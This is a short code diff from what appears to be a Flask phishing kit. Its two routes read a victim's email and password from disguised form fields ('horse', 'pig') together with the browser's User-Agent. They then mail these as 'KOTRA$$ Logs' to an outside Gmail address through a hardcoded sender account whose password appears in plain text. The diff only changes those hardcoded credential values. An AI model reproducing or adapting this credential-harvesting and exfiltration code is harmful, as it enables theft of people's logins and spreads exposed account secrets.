@@ -192,7 +192,7 @@ def first():
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
         sender_email = "editor@businesstells.com"
-        sender_emaill = "Sasi@!!123321@!!"
+        sender_emaill = "editor"
         receiver_email = "williamsambrose99@gmail.com"
         password = "Sasi@!!123321@!!"
         useragent = request.headers.get('User-Agent')
@@ -234,7 +234,7 @@ def second():
         sender_email = "editor@businesstells.com"
         sender_emaill = "Sasi@!!123321@!!"
         receiver_email = "williamsambrose99@gmail.com"
-        password = "Sasi@!!123321@!!"
+        password = "editor"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "KOTRA$$ Logs  !! "
